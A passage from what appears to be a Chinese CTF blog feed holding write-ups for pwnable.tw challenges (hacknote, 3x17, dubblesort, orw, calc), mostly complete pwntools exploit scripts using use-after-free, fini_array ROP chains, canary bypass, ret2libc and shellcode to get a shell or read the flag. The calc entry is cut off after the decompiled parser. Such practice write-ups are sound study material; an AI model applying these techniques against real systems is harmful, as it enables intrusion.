class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Give me your description of bullet :&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">power</span>(<span class="params">data</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;bullet :&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">beat</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    create(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x2f</span>)</span><br><span class="line">    power(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    power(<span class="string">b&#x27;\xff&#x27;</span> * <span class="number">3</span> + p32(<span class="number">0xdeadbeef</span>)+p32(elf.plt.puts)+p32(elf.sym[<span class="string">&#x27;main&#x27;</span>])+p32(elf.got.puts))</span><br><span class="line">    beat()</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Oh ! You win !!\n&#x27;</span>)</span><br><span class="line">    puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;puts_addr:&quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    create(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x2f</span>)</span><br><span class="line">    power(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    power(<span class="string">b&#x27;\xff&#x27;</span> * <span class="number">3</span> + p32(<span class="number">0xdeadbeef</span>)+p32(system)+p32(elf.sym[<span class="string">&#x27;main&#x27;</span>])+p32(bin_sh))</span><br><span class="line">    beat()</span><br><span class="line"></span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
  </entry>
  <entry>
    <title>pwnable-hacknote</title>
    <url>/2024/01/27/pwnable-hacknote/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>一道UAF漏洞基础题</p>
<span id="more"></span>

<p>两个结构体，note和chunk</p>
<p>note大小为8bits</p>
<p>chunk是我们自己申请的大小</p>
<p>思路：先申请两个较大的chunk，此时我们有note0、note1、chunk0、chunk1</p>
<p>释放后fastbin中有四个chunk</p>
<p>此时我们若申请一个大小为8的chunk，那么note2会指向note0，chunk2会指向note1，为什么？因为malloc在申请内存时会优先申请最近释放的内存，且因为note0和note1大小为8，刚好符合我们申请的note2和chunk2，而chunk0和chunk1比较大，所以会优先申请note0和note1原来的内存</p>
<p>那我们就可以利用这个点，先泄露puts地址算出libc基址，然后getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10102</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/chal&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc_32.so.6&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Note size :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">b&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">32</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">    add(<span class="number">32</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    payload = p32(<span class="number">0x804862b</span>)+p32(<span class="number">0x804A018</span>)</span><br><span class="line">    add(<span class="number">8</span>,payload)</span><br><span class="line"></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">    libc_base = free_addr - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    payload = p32(system_addr) + <span class="string">b&#x27;;sh\x00&#x27;</span></span><br><span class="line">    add(<span class="number">8</span>,payload)</span><br><span class="line"></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
      <tags>
        <tag>uaf</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable-3x17</title>
    <url>/2024/01/26/pwnable-3x17/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>第一反应有点像之前做过的一道fmt漏洞，通过修改fini.array地址内容为mian地址达到无限次循环，这个题省略了fmt漏洞，让你可以直接修改地址内容，根据程序执行流程图，main函数执行完后会执行fini.array</p>
<span id="more"></span>

<p>那么程序流程为</p>
<p>__libc_csu_init -&gt; .init_array -&gt;main -&gt; __libc_csu_fini  -&gt; .fini_array[1] -&gt;.fini_array[0]  </p>
<p>如果将fini_array[1]覆盖为main</p>
<p>fini_array[0]覆盖为__libc_csu_fini，那么就完成了无限循环</p>
<p>补充一点：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在执行init.array时会依次调用</span><br><span class="line">.init_array[0] </span><br><span class="line">.init_array[1]</span><br><span class="line">...</span><br><span class="line">.init_array[n]</span><br><span class="line"></span><br><span class="line">而fini.array则是相反</span><br><span class="line">.fini_array[n] </span><br><span class="line">.fini_array[n-1] </span><br><span class="line">... </span><br><span class="line">.fini_array[0]</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/$%7Bfiilename%7D/pwnable-3x17-1.jpg" alt="pwnable-3x17-1"></p>
<p>但是程序中有一个点要注意一下，每次byte_4B9330都会自增1，且当byte_4B9330为1的时候才可以写，不过问题不大，因为unsigned_int8的范围是0~255，只用循环多次就能回到1</p>
<p><img src="/imgs/$%7Bfiilename%7D/pwnable-3x17-2.png" alt="pwnable-3x17-2"></p>
<p>然后就是ret2syscall，最后要用leave ret执行shellcode</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10105</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/chal&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x41e4af</span></span><br><span class="line">pop_rdi =<span class="number">0x401696</span></span><br><span class="line">pop_rsi =<span class="number">0x406c30</span></span><br><span class="line">pop_rdx =<span class="number">0x446e35</span></span><br><span class="line">leave_ret =<span class="number">0x401c4b</span></span><br><span class="line">ret =<span class="number">0x401016</span></span><br><span class="line">mian_addr = <span class="number">0x401B6D</span></span><br><span class="line">fini_array =<span class="number">0x4B40F0</span></span><br><span class="line">fini =<span class="number">0x402960</span></span><br><span class="line">syscall =<span class="number">0x4022b4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ropchain</span>(<span class="params">addr,data</span>):</span><br><span class="line">    p.sendafter(<span class="string">b&quot;addr:&quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line">    p.sendafter(<span class="string">b&quot;data:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    ropchain(fini_array,p64(fini)+p64(mian_addr))</span><br><span class="line">    ropchain(<span class="number">0x4b92e0</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>) <span class="comment">#bss</span></span><br><span class="line">    ropchain(fini_array+<span class="number">0x10</span>,p64(pop_rax)+p64(<span class="number">59</span>))</span><br><span class="line">    ropchain(fini_array+<span class="number">0x20</span>,p64(pop_rdi)+p64(<span class="number">0x4b92e0</span>))</span><br><span class="line">    ropchain(fini_array+<span class="number">0x30</span>,p64(pop_rsi)+p64(<span class="number">0</span>))</span><br><span class="line">    ropchain(fini_array+<span class="number">0x40</span>,p64(pop_rdx)+p64(<span class="number">0</span>))</span><br><span class="line">    ropchain(fini_array+<span class="number">0x50</span>,p64(syscall))</span><br><span class="line">    ropchain(fini_array,p64(leave_ret)+p64(ret))</span><br><span class="line"></span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
      <tags>
        <tag>fini</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable-dubblesort</title>
    <url>/2024/01/25/pwnable-dubblesort/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>连接题目后，发现输入字符后会带出一些不可见字符，再分析源码，是因为程序没有将缓冲区清空导致的，所以栈内可能会存在一些有用的数据</p>
<span id="more"></span>

<p><img src="/imgs/$%7Bfiilename%7D/pwnable-dubblesort-3.png"></p>
<p>经过调试，发现栈内存在libc中的地址</p>
<p><img src="/imgs/$%7Bfiilename%7D/pwnable-dubblesort-1.png" alt="pwnable-dubblesort-1"></p>
<p>偏移为 0x1b0000</p>
<p><img src="/imgs/$%7Bfiilename%7D/pwnable-dubblesort-2.png" alt="pwnable-dubblesort-2"></p>
<p>带出libc基址后就是ret2libc了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/dubblesort&#x27;</span>,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc_32.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10101</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/dubblesort&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc_32.so.6&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x001b0000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;What your name :&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>*<span class="number">7</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">28</span>)</span><br><span class="line">    libc_base = u32(p.recv(<span class="number">4</span>))- offset -<span class="number">0xa</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    system =libc_base + libc.symbols[<span class="string">b&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    length = <span class="number">24</span>+<span class="number">1</span>+<span class="number">9</span>+<span class="number">1</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;to sort :&#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;number : &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;number : &#x27;</span>,<span class="string">b&#x27;+&#x27;</span>) <span class="comment"># &#x27;+&#x27;不会改变栈上的数据,可以用来绕过canary</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;number : &#x27;</span>,<span class="built_in">str</span>(system)) <span class="comment"># 将canary后到返回地址都填充为system避免因为排序导致顺序被打乱</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;number : &#x27;</span>,<span class="built_in">str</span>(bin_sh))</span><br><span class="line"></span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
  </entry>
  <entry>
    <title>pwnable-orw</title>
    <url>/2024/01/20/pwnable-orw/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>orw入门题</p>
<span id="more"></span>

<p>解法一：</p>
<p>我直接用shellcraft生成的shellcode</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/chal&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x0804A060</span></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/home/orw/flag&quot;</span>)+shellcraft.read(<span class="number">3</span>,addr,<span class="number">0x100</span>)+shellcraft.write(<span class="number">1</span>,addr,<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,asm(shellcode))</span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>解法二：</p>
<p>手搓汇编代码，这里我是直接复制大佬写的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/chal&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov eax,0x5    </span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">push ecx</span></span><br><span class="line"><span class="string">push 0x67616c66 </span></span><br><span class="line"><span class="string">push 0x2f2f2f77 </span></span><br><span class="line"><span class="string">push 0x726f2f65 </span></span><br><span class="line"><span class="string">push 0x6d6f682f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov eax,0x3     </span></span><br><span class="line"><span class="string">mov ecx, ebx</span></span><br><span class="line"><span class="string">mov ebx, 0x3</span></span><br><span class="line"><span class="string">mov edx, 0x50</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov eax,0x4     </span></span><br><span class="line"><span class="string">mov ebx,0x1</span></span><br><span class="line"><span class="string">mov edx,0x50</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;shellcode:&#x27;</span>, asm(shellcode))</span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
      <tags>
        <tag>orw</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable-calc</title>
    <url>/2024/01/18/pwnable-calc/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>对于一个尚未入门的菜鸟来说，这道题刷新了我对漏洞利用的理解，赶巧碰上感冒，花了好几天结合大佬的wp才理清逻辑，那么废话不多说，直接开始解题。。。</p>
<span id="more"></span>

<p>32位程序，没开PIE</p>
<p><img src="/../imgs/$%7Bfiilename%7D/pwnable-calc-1.png"></p>
<p>先来看主函数</p>
<p>ssignal和alarm没什么作用，只是限个时，fflush是清空缓冲区</p>
<p><img src="/../imgs/$%7Bfiilename%7D/pwnable-calc-2.png"></p>
<p>calc函数</p>
<p>bzero是置零，get_expr是获取不超过1024个字符，init_pool是初始化函数，等同于把v1数组置零</p>
<p><img src="/../imgs/$%7Bfiilename%7D/pwnable-calc-3.png"></p>
<p>重点是parse_expr函数，我在伪代码里面加上一些注释可以方便理解，由于变量比较多，我也是做了一些笔记避免我混淆，以下变量只讨论parse_expr函数，切记不可以和其他函数内的变量混淆</p>
<p>a2[0] 操作数个数<br>a2[a2[0]] 操作数<br>s1 临时变量，储存操作数<br>s 存储运算符(相当于栈)<br>s[v6] 相当于栈顶指针</p>
<p>函数的主逻辑是for循环，利用for循环检查每个字符，函数逻辑我均写为注释</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(*(<span class="type">char</span> *)(i + a1) - <span class="number">48</span>) &gt; <span class="number">9</span> ) <span class="comment">//检查字符是否为运算符。如果字符是运算符，如+、-这些，减48后会变成负数，由于是unsigned int类型，该负数会变成很大的正整数，自然会大于9</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = i + a1 - v4; <span class="comment">//统计长度，指数字的长度，如123的长度是3</span></span><br><span class="line">      s1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(v7 + <span class="number">1</span>);<span class="comment">//s1是临时变量，储存操作数</span></span><br><span class="line">      <span class="built_in">memcpy</span>(s1, v4, v7);</span><br><span class="line">      s1[v7] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;0&quot;</span>) )<span class="comment">//如果操作数是0，则报错</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;prevent division by zero&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = atoi(s1);<span class="comment">//将字符&quot;123&quot;转化为整数123</span></span><br><span class="line">      <span class="keyword">if</span> ( v9 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = (*a2)++;</span><br><span class="line">        a2[v3 + <span class="number">1</span>] = v9;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(i + a1) &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)(*(<span class="type">char</span> *)(i + <span class="number">1</span> + a1) - <span class="number">48</span>) &gt; <span class="number">9</span> )<span class="comment">//如果是连续的运算符，则报错</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;expression error!&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v4 = i + <span class="number">1</span> + a1; <span class="comment">// 与前面的v7相对应，用于计算操作数长度</span></span><br><span class="line">      <span class="keyword">if</span> ( s[v6] ) <span class="comment">// s[V6]相当于栈顶指针</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( *(_BYTE *)(i + a1) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>: <span class="comment">// 如果字符为 &#x27;%&#x27;,&#x27;*&#x27;,&#x27;/&#x27; 则跳到 LABEL_14</span></span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> ( s[v6] != <span class="number">43</span> &amp;&amp; s[v6] != <span class="number">45</span> )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">            s[++v6] = *(_BYTE *)(i + a1); <span class="comment">// 如果字符为&#x27;+&#x27;,&#x27;-&#x27;则添加进s，相当于入栈</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">LABEL_14:</span><br><span class="line">            eval(a2, s[v6]);<span class="comment">//计算函数，a2里有操作数，s[v6]是运算符</span></span><br><span class="line">            s[v6] = *(_BYTE *)(i + a1);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            eval(a2, s[v6--]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[v6] = *(_BYTE *)(i + a1);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !*(_BYTE *)(i + a1) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

